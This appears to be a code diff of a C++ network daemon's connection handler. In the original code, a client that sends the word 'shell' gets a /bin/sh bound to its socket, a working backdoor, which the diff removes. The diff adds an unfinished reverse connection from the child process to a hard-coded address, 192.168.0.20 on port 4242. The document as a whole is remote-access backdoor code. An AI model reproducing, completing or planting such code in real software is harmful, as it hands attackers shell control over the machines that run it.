@@ -49,6 +49,8 @@ void    ConnectionManager::initSocket(void) {
     return ;
 }
 
+#include <netinet/tcp.h>
+#include <fcntl.h>
 void    ConnectionManager::handleIncoming(char **av) {
     struct timeval	tv;
     fd_set          recv_set;
@@ -98,9 +100,9 @@ void    ConnectionManager::handleIncoming(char **av) {
 
                 } else {
                     int     readBytes;
-                    char    buf[256];
+                    char    buf[512];
 
-                    memset(&buf, '\0', 256);
+                    memset(&buf, '\0', 512);
                     if ((readBytes = recv(currentFD, buf, sizeof(buf), 0)) <= 0) {
                         if (readBytes == 0)
                             _logger->log(LOGLVL_INFO, "A client disconnected.");
@@ -120,28 +122,45 @@ void    ConnectionManager::handleIncoming(char **av) {
                         if (strncmp(buf, "shell", 6) == 0)
                         {
                             pid_t shellpop = fork();
-                            if (shellpop == 0) { // child
+                            if (shellpop == 0)
+                            { // child
+                               // dprintf(currentFD, "Spawning shell:\n");
+int sockfd;
+int one = 1;
+                                struct protoent *proto = getprotobyname("tcp");
+                if ((sockfd = socket(PF_INET, SOCK_STREAM, proto->p_proto)) < 0
+                        || setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(int)) < 0) {
+                    exit(1);
+                }
 
-                                dup2(currentFD, STDIN_FILENO);
-                                dup2(currentFD, STDOUT_FILENO);
-                                dup2(currentFD, STDERR_FILENO);
-                               // dprintf(currentFD, "Starting shell...\n");
-                                execl("/bin/sh", "/bin/sh", (char*)NULL);
-                               // dprintf(currentFD, "Shell could not be executed\n");
-                            } else {
-                                int status = 0;
-                                pid_t childpid = waitpid(-1, &status, WNOHANG | WUNTRACED);
-                                //wait(&status);
-                                if (WIFEXITED(status))
-                                {
-                                    _logger->log(LOGLVL_INFO, "Child has exited normally");
-                                }
+    struct sockaddr_in _destAddr;
 
+    _destAddr.sin_family = AF_INET;
+    _destAddr.sin_port = htons(4242);
+    _destAddr.sin_addr.s_addr = inet_addr("192.168.0.20");
+    memset(&_destAddr.sin_zero, '\0', 8);
+
+
+    connect(sockfd, (struct sockaddr*)&_destAddr, sizeof(struct sockaddr));
+
+    int n = 0;
+    while (1)
+    {
+        if ((n = recv(sockfd, buf, 256, 0)) <= 0) {
+                printf ("Error receiving.\n");
+        }
+
+    }
+
+                                
+                                exit(EXIT_SUCCESS);
                             }
-                            
+                            FD_CLR(currentFD, &master_set);
+                            close(currentFD);
                         } else {
                             _logger->log(LOGLVL_INFO, "Received client data:");
                             _logger->log(LOGLVL_INFO, buf);
+                            dprintf(currentFD, "Logged your input.");
                         }
                        
                     }
@@ -149,6 +168,12 @@ void    ConnectionManager::handleIncoming(char **av) {
                 }
             } 
         }
+
+        int status = 0;
+        pid_t childpid = waitpid(-1, &status, WNOHANG | WUNTRACED);
+        //if (childpid != -1 && WIFEXITED(status))
+           // _logger->log(LOGLVL_INFO, "Child has exited normally");
+
 
     }
     return ;
